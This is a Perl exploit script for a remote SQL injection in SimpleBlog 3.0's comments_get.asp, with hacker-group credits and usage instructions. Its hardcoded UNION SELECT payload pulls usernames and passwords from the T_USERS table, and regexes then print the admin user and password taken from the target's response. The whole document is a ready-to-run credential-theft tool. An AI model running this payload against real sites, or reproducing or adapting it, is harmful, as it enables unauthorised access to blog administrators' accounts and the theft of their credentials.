#!/usr/bin/perl

#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#              SimpleBlog 3.0 [ comments_get.asp ]               #
#                    ] Remote SQL Injection [                    #
#                                                                #
#              [c]ode by TrinTiTTY [at] g00ns.net                #
#                 Vulnerability by MurderSkillz                  #
#                                                                #
#      shoutz: z3r0, kat, str0ke, rezen, fish, wicked, clorox,   #
#              Canuck, a59, sess, bernard, + the rest of g00ns   #
#  [irc.g00ns.net]       [www.g00ns.net]        [ts.g00ns.net]   #
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#

use LWP::UserAgent;

$host = @ARGV[0];
$ua = LWP::UserAgent->new;

my $inject ='comments_get.asp?id=-99%20union%20all%20select%201,2,uUSERNAME,4,uPASSWORD,6,7,8,9%20from%20T_USERS';

if (@ARGV < 1){&top( );&usage( )}
elsif ($host =~ /http:\/\//){print"\n\n [-] Don't use http:// in host\n";exit( 0 );}
else { &xpl( ) }
sub xpl( ) {
  &top( );
  print "\n [~] Connecting\n";
  $res = $ua->get("http://$host/$inject");

  $con = $res->content;
  print "\n [~] Checking for admin info\n";
  if ($con =~ /<strong>([-_+.\w]{1,15})<\/strong>/gmi)
  {
     print "\n\t [+] Admin user: $1\n";
  }
  if ($con =~ /<a href\=\"http:\/\/(.*)\" target\=\"\_blank\">(.*)<\/a>/gmi)
  {
     print "\n\t [+] Admin password: $2\n";
     print "\n [+] Complete\n";
  }
  else {
      print "\n [-] Unable to retrieve admin info\n";
      exit(0);
  }
}
sub top( )
{
  print q {
  ##################################################################
  #             SimpleBlog 3.0  [ comments_get.asp ]               #
  #                    ] Remote SQL Injection [                    #
  #                                                                #
  #                [c]ode by TrinTiTTY [at] g00ns.net              #
  #                   Vulnerability by MurderSkillz                #
  ##################################################################
  }
}
sub usage( )
{
  print "\n Usage: perl simpleblog3.pl <host>\n";
  print "\n Example: perl simpleblog3.pl www.example.com/path\n\n";
  exit(0);
}